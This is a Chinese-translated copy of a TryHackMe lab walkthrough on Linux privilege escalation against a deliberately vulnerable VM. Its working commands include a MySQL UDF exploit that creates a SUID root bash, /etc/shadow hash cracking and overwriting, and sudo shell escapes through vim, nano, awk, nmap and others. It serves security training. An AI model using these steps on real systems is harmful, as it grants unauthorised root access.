<html>
<head>
<title>Linux PrivEsc Tryhackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Linux PrivEsc Tryhackme文章</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5?source=collection_archive---------1-----------------------#2021-04-20">https://infosecwriteups.com/linux-privesc-tryhackme-writeup-bf4e32460ee5?source=collection_archive---------1-----------------------#2021-04-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="0000" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">这是一篇关于Tryhackme房间“JLinux PrivEsc”的文章</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/60884009c17181dbbebfb9e0647cee22.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*-jIMBWfsedCUSu0cLVlkBw.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated"><a class="ae kv" href="https://tryhackme.com/room/linuxprivesc" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxprivesc</a></figcaption></figure><p id="ecc0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">房间链接:</strong><a class="ae kv" href="https://tryhackme.com/room/linuxprivesc" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxprivesc</a><br/><strong class="ky ir">注:此房免费</strong></p><h1 id="8e33" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务1:部署易受攻击的Debian虚拟机</h1><p id="5639" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">这个房间旨在向您介绍各种Linux权限提升技术。要做到这一点，您必须首先部署一个故意易受攻击的Debian VM。这个虚拟机是萨基·沙哈尔创建的，作为他的<a class="ae kv" href="https://github.com/sagishahar/lpeworkshop" rel="noopener ugc nofollow" target="_blank"> <strong class="ky ir">本地权限提升研讨会</strong> </a>的一部分，但已经被<a class="ae kv" href="https://twitter.com/TibSec" rel="noopener ugc nofollow" target="_blank"> Tib3rius </a>更新，作为他的<a class="ae kv" href="https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">OSCP及更远地区的Linux权限提升的一部分！</strong></a>Udemy上的课程。这里提供了对本会议室中使用的各种技术的完整解释，以及在Linux中查找权限提升的演示和提示。</p><p id="624a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在尝试访问Debian虚拟机之前，请确保您已连接到<a class="ae kv" href="https://tryhackme.com/access" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">TryHackMe VPN</strong></a><strong class="ky ir">或使用浏览器内Kali实例！</strong></p><p id="c5ca" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">SSH应该在端口22上可用。您可以使用以下命令登录到“用户”帐户:</p><p id="e6a0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ssh user@10.10.25.177</code></p><p id="34a7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">如果您看到以下消息:“您确定要继续连接吗(是/否)？”键入<strong class="ky ir"> yes </strong>并按下<strong class="ky ir">进入</strong>。</p><p id="7641" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">“用户”帐户的密码是“<strong class="ky ir"> password321 </strong>”。</p><p id="8451" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">接下来的任务将带您了解不同的权限提升技术。在每个技术之后，你应该有一个根壳。<strong class="ky ir">在开始下一个任务之前，记得退出shell和/或作为“用户”帐户重新建立会话！</strong></p><p id="1d70" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">部署机器并使用SSH登录到“用户”帐户。</p><p id="8d17" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问1: </strong>运行“id”命令。结果如何呢？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/cbee1f94095a8e8c3d66c2fbcb3401e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2ux8tWQXVJrSLMuGz5hIDw.png"/></div></div></figure><blockquote class="mu mv mw"><p id="5829" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir">答案:uid=1000(用户)gid=1000(用户)groups=1000(用户)，24(cdrom)，25(软盘)，29(音频)，30(dip)，44(视频)，46(plugdev) </strong></p></blockquote><h1 id="26a0" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务2:服务利用</h1><p id="2512" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">MySQL服务以root用户身份运行，并且该服务的“root”用户没有分配密码。我们可以使用一个<a class="ae kv" href="https://www.exploit-db.com/exploits/1518" rel="noopener ugc nofollow" target="_blank">流行的漏洞</a>，它利用用户定义函数(UDF)通过MySQL服务以root用户身份运行系统命令。</p><p id="64b9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">转到/home/user/tools/mysql-udf目录:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="0680" class="nf lt iq ms b gy ng nh l ni nj">cd /home/user/tools/mysql-udf</span></pre><p id="c634" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用以下命令编译raptor_udf2.c漏洞利用代码:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nk"><img src="../Images/1025fc967f4b7c9f34012582c4068f95.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zk4TzqMJrY96AqLtcw7lww.png"/></div></div></figure><p id="8760" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">以root用户身份使用空白密码连接到MySQL服务:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="aaef" class="nf lt iq ms b gy ng nh l ni nj">mysql -u root</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nl"><img src="../Images/c6c8c1b8bfebd7f2a3f228f27af520c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T7rgafaZV2MDgnhsjB0TgA.png"/></div></div></figure><p id="16d4" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在MySQL shell上执行以下命令，使用我们编译的漏洞创建一个用户定义的函数(UDF)“do _ system”:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nm"><img src="../Images/43875acf4686ed4a3e27b56c488b02ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lmNC7l1KckZxBONqMmBt4g.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nn"><img src="../Images/15552c04aff427e4232e07dbbe081ab0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jif01N3AZfxmYXqhDAX8zA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi no"><img src="../Images/c7dce3b166bd0401267d5dc1b16ff37c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YYImvNFDBoekkMnIn97SUg.png"/></div></div></figure><p id="9fe7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用函数将/bin/bash复制到/tmp/rootbash，并设置SUID权限:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="7a80" class="nf lt iq ms b gy ng nh l ni nj">select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');</span></pre><p id="0cb1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">退出MySQL shell(键入<strong class="ky ir"> exit </strong>或<strong class="ky ir"> \q </strong>并按<strong class="ky ir"> Enter </strong>)并使用-p运行/tmp/rootbash可执行文件以获得以root权限运行的shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="c63a" class="nf lt iq ms b gy ng nh l ni nj">/tmp/rootbash -p</span></pre><p id="2c1d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前删除/tmp/rootbash可执行文件并退出根shell，因为您稍后将在房间中再次创建该文件！</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="2c6c" class="nf lt iq ms b gy ng nh l ni nj">rm /tmp/rootbash<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/90bfc13104286a211fbab38e78b2410f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ChnJTEcfwbSmkflOTkjwxA.png"/></div></div></figure><h1 id="cb4e" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务3:弱文件权限-可读/etc/shadow</h1><p id="d680" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated"><strong class="ky ir">问1: </strong> <strong class="ky ir">什么是root用户的密码hash？</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi np"><img src="../Images/e04e9dfee1703178d368fabde4655b8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HDbXtQnREtMC_wCz19kuEA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nq"><img src="../Images/ccd202b9e39e2e477f74f8d645c4c8b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g34nwBBAoKk3WvwHtQZoag.png"/></div></div></figure><p id="f675" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">正如我们所看到的，root和user的哈希是暴露的，可以离线破解！</p><p id="e3d2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问2:使用了什么哈希算法来生成根用户的密码哈希？</strong></p><p id="ccea" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">密码的格式为<code class="fe mp mq mr ms b">$id$salt$hash</code>，id的可能值为:</p><ul class=""><li id="5344" class="nr ns iq ky b kz la lc ld lf nt lj nu ln nv lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$1$</code> : MD5</li><li id="19c6" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$2$</code>:河豚</li><li id="4e99" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$3$</code>:河豚</li><li id="ce34" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$5$</code> : SHA256</li><li id="3163" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$6$</code> : SHA512</li></ul><p id="e9a3" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">$6$</code>为SHA512。开膛手约翰会给出这个信息。</p><p id="2860" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">我们可以使用另一个名为“hashid”的工具来确定哈希类型。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi of"><img src="../Images/89dd1489f22d65967b1740d77b9b7501.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nFFUtFq807u70dSW8xdliQ.png"/></div></div></figure><p id="2bc8" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问root用户的密码是什么？</strong></p><p id="2f64" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">我们可以使用开膛手约翰破解密码，这也告诉我们使用的哈希算法。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi og"><img src="../Images/b52046dc95e2622c3e7285bd7736e279.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9akAsq58fZNy7gZsS8vjmw.png"/></div></div></figure><h1 id="4c3a" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务4:弱文件权限-可写/etc/shadow</h1><p id="718e" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">虚拟机上的/etc/shadow文件不仅是全局可读的，而且是全局可写的。这可能会被滥用，方法是将root的哈希改为一个我们知道明文密码的新哈希。</p><p id="1431" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">“mkpasswd”实用程序用于创建新的sha-512密码。使用vim替换root的新散列。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nn"><img src="../Images/4c7de8e0b9052f169294a0716698186f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3d_9bK5UbKJeirLBpGQNTg.png"/></div></div></figure><p id="b7e3" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用root用户和新密码“pass123”通过SSH访问虚拟机</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/0979039b5b7b16bc19f6aaddde172019.png" data-original-src="https://miro.medium.com/v2/resize:fit:692/format:webp/1*5Y8lkj8VJIvPWt_rX-ALxg.png"/></div></figure><h1 id="2fdc" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务5:弱文件权限——可写/etc/passwd</h1><p id="3a23" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">/etc/passwd文件包含有关用户帐户的信息。它是全球可读的，但通常只有根用户可写。从历史上看,/etc/passwd文件包含用户密码散列，某些版本的Linux仍然允许在其中存储密码散列。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/4838e2332e00368fe12ed8712ec5b214.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4hhe5Iiy0PHTcYdvhi76ew.png"/></div></div></figure><h1 id="1037" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务6: Sudo -Shell转义序列</h1><p id="9fe5" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">列出sudo允许您的用户运行的程序:</p><p id="fffd" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">sudo -l</code></p><p id="91d7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">访问GTFOBins(<a class="ae kv" href="https://gtfobins.github.io" rel="noopener ugc nofollow" target="_blank">https://GTFOBins . github . io</a>)搜索一些程序名。如果程序列出了“sudo”作为一个函数，您可以使用它来提升权限，通常是通过转义序列。</p><p id="0590" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">从列表中选择一个程序，并按照GTFOBins的说明尝试获得一个根shell。</p><p id="01c2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">对于一个额外的挑战，尝试使用列表中的所有程序获得一个根shell！</p><p id="0302" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前退出根shell！</strong></p><p id="62f1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">“用户”可以通过sudo运行多少个程序？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/37e1ac416c684dc5bd3fe71c0968f68b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1308/format:webp/1*citspFoZr_9-ztgtFKBxBg.png"/></div></figure><blockquote class="mu mv mw"><p id="44f2" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir">答案:11 </strong></p></blockquote><p id="bdb0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问题2: </strong>列表中的一个程序在GTFOBins上没有shell转义序列。到底是哪个？</p><blockquote class="mu mv mw"><p id="ad58" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir">答案:apache2 </strong></p></blockquote><p id="deb5" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">if top</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/iftop/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/iftop/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="1593" class="nf lt iq ms b gy ng nh l ni nj">sudo iftop<br/>!/bin/sh</span></pre><p id="1638" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">复制整个命令并粘贴它</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/dc728b77579de2f48dc9ca2f2f8222e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:706/format:webp/1*PxaNOdMOQEW5XdyM6-oRKA.png"/></div></figure><p id="8b1e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">找到</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/find/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/find/</a>)</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/e8aa5a5617fc7370b0556a6ef5761b9d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1058/format:webp/1*keWoDq3Mcw3udb9Lm4Y82g.png"/></div></figure><p id="2752" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">纳米</strong>(【https://gtfobins.github.io/gtfobins/nano/】T21)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="29b3" class="nf lt iq ms b gy ng nh l ni nj">sudo nano<br/>^R^X<br/>reset; sh 1&gt;&amp;0 2&gt;&amp;0</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ol"><img src="../Images/07a9d6636315348a0bd2accf5bf2dc71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CRSL1LzLCH25flavN-tIZw.png"/></div></div></figure><p id="3748" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">维姆(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/vim/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/vim/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="f10e" class="nf lt iq ms b gy ng nh l ni nj">sudo vim -c ':!/bin/bash'</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi om"><img src="../Images/d0bd7d9f8c2eff1a26c8d9c5397ecf5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:864/format:webp/1*9KSablPHufes6R65pS7Jvw.png"/></div></div></figure><p id="eed2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">男人</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/man/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/man/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="ac55" class="nf lt iq ms b gy ng nh l ni nj">sudo man man<br/>!/bin/bash</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi on"><img src="../Images/e2644d42d62980912539974f4cc93334.png" data-original-src="https://miro.medium.com/v2/resize:fit:648/format:webp/1*zTKLa_6x6gCqL3gZjdsKqg.png"/></div></figure><p id="d4bd" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">awk</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/awk/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/awk/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="de58" class="nf lt iq ms b gy ng nh l ni nj">sudo awk 'BEGIN {system("/bin/bash")}'</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/4a3c4c636fd93f70f2e423d124f9cb3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*S30O6zpIcnLYCHQceNa41w.png"/></div></figure><p id="7294" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">少了</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/less/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/less/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="70cb" class="nf lt iq ms b gy ng nh l ni nj">sudo less /etc/profile<br/>!/bin/sh</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi op"><img src="../Images/262b6c31c2cf95fc657e14734d5fb8db.png" data-original-src="https://miro.medium.com/v2/resize:fit:812/format:webp/1*-kFKEnfFL1jp8us6w7fR2A.png"/></div></figure><p id="442f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">FTP</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/ftp/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/ftp/</a>)</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="23f6" class="nf lt iq ms b gy ng nh l ni nj">sudo ftp<br/>!/bin/sh</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/eb0657d69dd51655a85edbaa813448a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:578/format:webp/1*lsrsSl0Ez05COCYwLPANpg.png"/></div></figure><p id="706d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">nmap</strong>(<a class="ae kv" href="https://gtfobins.github.io/gtfobins/nmap/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/nmap/</a>)</p><p id="b1e6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">安装了Nmap 5.00，它具有交互模式:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="793d" class="nf lt iq ms b gy ng nh l ni nj">sudo nmap --interactive<br/>nmap&gt; !sh</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi or"><img src="../Images/3d7fb7e1d3b4ef5fe5be11f1fd7f7ea5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/1*u5JPvLEjbDfB0zMCgpb4kg.png"/></div></figure><h1 id="6ff7" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务7: Sudo环境变量</h1><p id="95fd" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">正如演练所说，</p><blockquote class="mu mv mw"><p id="2aac" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><em class="iq">程序运行时，LD_PRELOAD先加载一个共享对象</em></p></blockquote><p id="9735" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">这意味着我们可以创建一个共享对象(生成一个shell ),并在程序执行期间将它传递给这个环境变量(使用sudo作为根shell ),以便在实际程序被调用之前执行它</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi os"><img src="../Images/efc4cc6e5b596e65151f2d2dee940a8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LbfZUEM7hw00XVtdUSWVLA.png"/></div></div></figure><p id="e6c7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">是的，它甚至适用于其他库，这是由于利用源代码的性质</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ot"><img src="../Images/9c9c0b75c129f8965568d331671fb080.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8u4BpLVAtbAyFXPHfo7FaQ.png"/></div></div></figure><p id="424a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">细说起来，<code class="fe mp mq mr ms b">/home/user/tools/sudo/preload.c</code>的内容是</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ou"><img src="../Images/a977db4b1697f030521a27521f8499fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ycwQcGRXd9WmUQQTC79bpA.png"/></div></figure><p id="d118" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">而<code class="fe mp mq mr ms b">/home/user/tools/sudo/library_path.c</code>的内容是</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/ef9cd4bdceef925b690d7af95cd228fe.png" 